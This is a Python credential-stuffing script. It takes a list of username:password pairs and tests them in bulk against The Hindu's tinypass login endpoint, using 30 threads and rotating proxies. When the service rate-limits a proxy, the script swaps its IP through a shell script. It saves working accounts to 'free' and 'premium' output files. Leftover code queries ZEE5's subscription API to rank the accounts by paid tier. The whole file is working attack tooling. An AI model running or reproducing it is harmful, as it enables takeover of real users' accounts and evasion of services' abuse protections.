import requests
from bs4 import BeautifulSoup
import sys
import time
import datetime
import queue
import threading
import random
import subprocess
import code
import json


HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

free = 0
prem = 0
count = 1
q = queue.Queue()
lock = []
availabel = []
ip_dict = {}
thrds = 30
if (len(sys.argv) >= 3):
    thrds = int(sys.argv[3])

input_file = sys.argv[1]
output_file_free = "HINDUAc_Free"+datetime.datetime.now().strftime("%d-%h-%H-%M")
output_file_paid = "HINDUAc_Premium_" + \
    datetime.datetime.now().strftime("%d-%h-%H-%M")
countFile = "."+sys.argv[0]+"_"+input_file+"_count"
proxy_file = sys.argv[2]
MAX_PROXY = 0

ua = 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Mobile Safari/537.36'
#ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'

loginURL = 'https://id.tinypass.com/id/api/v1/identity/passwordless/login/token?aid=3qrmsuqPpu&lang=en_US'
subURL = "https://subscriptionapi.zee5.com/v1/subscription?translation=en&include_all=true"

headv1 = {
    # ":authority": "id.tinypass.com",
    # ":method": "POST",
    # ":path": "/id/api/v1/identity/passwordless/login/token?aid=3qrmsuqPpu&lang=en_US",
    # ":scheme": "https",
    "accept": "application/json, text/plain, */*",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9,hi;q=0.8",
    "content-type": "application/json",
    "origin": "https://id.tinypass.com",
    "referer": "https://id.tinypass.com/id/?client_id=3qrmsuqPpu&sender=piano-id-IF2sC&origin=https:%2F%2Fwww.thehindu.com&site=https:%2F%2Fwww.thehindu.com&parent_uri=https:%2F%2Fwww.thehindu.com%2F&display_mode=modal&lang=en_US&width=400",
    "sec-ch-ua": '"Google Chrome";v="89", "Chromium";v="89", ";Not\"A\\Brand";v="99"',
    "sec-ch-ua-mobile": "?1",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 XL Build/OPD1.170816.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36"
}
fi = open(input_file, 'r', errors='ignore')


def loadProxies():
    global MAX_PROXY
    global lock
    global availabel
    d = open(proxy_file, 'r')
    counter = 0
    for i in d.readlines():
        ip_dict[counter] = i.strip()
        lock.append(0)
        availabel.append(1)
        counter += 1
    if len(ip_dict) == 0:
        MAX_PROXY = 0
        ip_dict[counter] = ""
        lock.append(0)
        availabel.append(1)

    else:
        MAX_PROXY = len(ip_dict)-1
    print("Loaded "+str(counter)+" Proxies")


def loadQ():
    global count
    try:
        c = open(countFile, "r")
        cl = c.readline().strip()
        count = int(cl)
        for i in range(int(cl)):
            fi.readline()
    except:
        print("No Resume File Found")
    line = fi.readline()
    while len(line):
        q.put(line)
        line = fi.readline().strip()
    fi.close()


def free_ip():
    global availabel
    global ip_dict

    rand = 0
    while True:
        rand = random.randint(0, MAX_PROXY)
        if availabel[rand] == 1:
            break
    return ip_dict[rand], rand


def get_proxy():
    if MAX_PROXY == 0:
        return "", 0
    ip, container = free_ip()
    proxy = {"http": "http://"+ip,
             "https": "http://"+ip}
    return proxy, container


def countLoc():
    global count
    count = count+1
    f2 = open(countFile, 'w')
    f2.write(str(count))
    f2.close()


def writeFree(cred1):
    f1 = open(output_file_free, 'a')
    f1.write(cred1+"\n")
    f1.close()


def ban_ip(container):
    global availabel
    global ip_dict
    availabel[container] = 0
    print(ip_dict[container]+"  Blocked ")
    lock[container] += 1  # Setting Container offset
    if lock[container] == 1:
        unban_ip(container)
    else:
        print("Changing IP")


def unban_ip(container):
    print("first Thread Unblocking ")
    container_nm = str(container+1)
    print("Calling process for Container "+container_nm)
    time.sleep(5)
    res = subprocess.check_output(["change_tp.sh", container_nm])
    for line in res.splitlines():
        print(line)
    lock[container] = 0
    availabel[container] = 1
    print("unblocked")


def writePaid(cred1, subs, date):
    f1 = open(output_file_paid, 'a')
    template = cred1+" | Subscription: "+subs+" | Expiry: "+date
    f1.write(template+"\n")
    f1.close()


def checkSub(page, proxy):
    authToken = page.json()['access_token']
    headv2 = {
        'accept': 'application/json',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
        'origin': 'https://www.zee5.com',
        'referer': 'https://www.zee5.com/signin',
        'user-agent': ua,
        'Authorization': 'bearer '+authToken
    }
    r1 = requests.get(subURL, headers=headv2, proxies=proxy)
    lis = r1.json()
    if len(lis) == 0:
        return "FREE", "null"
    return str(lis[0]['subscription_plan']['original_title']), str(lis[0]['subscription_plan']['end'])


def statusUpdate(cred, subs, container, id):
    global free
    global prem
    template = ""
    if id == 1:
        template = cred+" | Subscription: "+OKBLUE+BOLD+subs+ENDC+" | COUNTS= Total:" + \
            str(count)+" Free:"+WARNING+str(free)+ENDC+" Premium:" + \
            WARNING+str(prem)+ENDC+" ~ Proxy: "+str(ip_dict[container])
    elif id == 2:
        template = cred+" | Error: "+FAIL+BOLD+subs+ENDC+" | COUNTS= Total:" + \
            str(count)+" Free:"+WARNING+str(free)+ENDC+" Premium:" + \
            WARNING+str(prem)+ENDC+" ~ Proxy: "+str(ip_dict[container])
    print(template)


def writeToFile(cred, subs, date):
    global free
    global prem
    if subs == "FREE":
        writeFree(cred)
        free += 1
    else:
        writePaid(cred, subs, date)
        prem += 1


class ThreadC(threading.Thread):
    def __init__(self, q):
        threading.Thread.__init__(self)
        self.queue = q

    def run(self):
        while not q.empty():
            cred = q.get().strip()
            un = cred.split(":")[0]
            pas = cred.split(":")[1]
            r = requests.Session()
            try:
                r.get(url="https://www.thehindu.com/")
                proxy, container = get_proxy()
                r.proxies = proxy
                myusr = {"redirectUri": "https://www.thehindu.com/",
                         "login": un, "createPasswordlessUser": "false"}
                r1 = r.post(url=loginURL, headers=headv1,
                            data=json.dumps(myusr), proxies=proxy)
                print(r1.text)
                if(r1.status_code == 200):
                    # subs, exdate = checkSub(r1, proxy)
                    statusUpdate(cred, "Account Hai", container, 1)
                    writeToFile(cred, "subs", "exdate")
                else:
                    # print(r1.text)
                    if(r1.status_code == 429):
                        raise Exception("manual block")
                    statusUpdate(cred, str(r1.status_code), container, 2)
                countLoc()
                self.queue.task_done()

            except:
                print("TIMEOUT OCCURED WAITING")
                print("Unexpected error:", sys.exc_info()[1])
                ban_ip(container)
                q.put(cred)
                self.queue.task_done()


def main():
    loadQ()
    loadProxies()
    for i in range(thrds):
        t = ThreadC(q)
        t.start()
    q.join()


main()
